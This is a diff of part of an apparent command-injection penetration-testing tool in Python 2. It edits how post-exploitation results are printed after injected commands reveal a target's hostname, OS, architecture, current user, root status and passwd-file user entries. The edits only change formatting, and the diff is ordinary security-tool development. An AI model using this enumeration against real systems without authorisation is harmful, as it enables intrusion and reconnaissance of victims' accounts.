@@ -34,9 +34,9 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
     response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
     shell = eb_injector.injection_results(response,TAG)
     if shell:
+      shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
       if menu.options.verbose:
 	print ""
-      shell = "".join(str(p) for p in shell)
       if not menu.options.verbose:
 	print ""
       sys.stdout.write(colors.BOLD + "(!) The hostname is " + colors.UNDERL + shell + colors.RESET + ".\n")
@@ -48,13 +48,15 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
     response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
     target_os = eb_injector.injection_results(response,TAG)
     if target_os:
-      target_os = "".join(str(p) for p in target_os)
+      target_os = "".join(str(p) for p in target_os).replace(" ", "", 1)[:-1]
+      if menu.options.verbose:
+	print ""
       if target_os == "Linux":
 	cmd = settings.RECOGNISE_HP
 	response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
 	target_arch = eb_injector.injection_results(response,TAG)
 	if target_arch:
-	  target_arch = "".join(str(p) for p in target_arch)
+	  target_arch = "".join(str(p) for p in target_arch).replace(" ", "", 1)[:-1]
 	  sys.stdout.write(colors.BOLD + "(!) The target operating system is " + colors.UNDERL + target_os + colors.RESET)
 	  sys.stdout.write(colors.BOLD + " and the hardware platform is " + colors.UNDERL + target_arch + colors.RESET + ".\n")
 	  sys.stdout.flush()
@@ -68,14 +70,16 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
     response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
     cu_account = eb_injector.injection_results(response,TAG)
     if cu_account:
-      cu_account = "".join(str(p) for p in cu_account)
+      cu_account = "".join(str(p) for p in cu_account).replace(" ", "", 1)[:-1]
       # Check if the user have super privilleges.
       if menu.options.is_root:
 	cmd = settings.ISROOT
 	response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
 	shell = eb_injector.injection_results(response,TAG)
+	if menu.options.verbose:
+	  print ""
 	if shell:
-	  shell = "".join(str(p) for p in shell)
+	  shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
 	  sys.stdout.write(colors.BOLD + "(!) The current user is " + colors.UNDERL + cu_account + colors.RESET)
 	  if shell != "0":
 	      sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "not" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".\n")
@@ -97,6 +101,8 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
       sys_users = sys_users.replace("(@)","\n")
       sys_users = sys_users.split( )
       if len(sys_users) != 0 :
+	if menu.options.verbose:
+	  print ""
 	sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
 	sys.stdout.flush()
 	sys.stdout.write(colors.BOLD + "\n(!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + colors.RESET)
@@ -156,10 +162,10 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
     response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
     shell = eb_injector.injection_results(response,TAG)
     if shell:
+      shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
       if menu.options.verbose:
 	print ""
-      shell = "".join(str(p) for p in shell)
-      print "\n\n" + colors.GREEN + colors.BOLD + shell + colors.RESET
+      print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET
       sys.exit(0)
 
 # eof
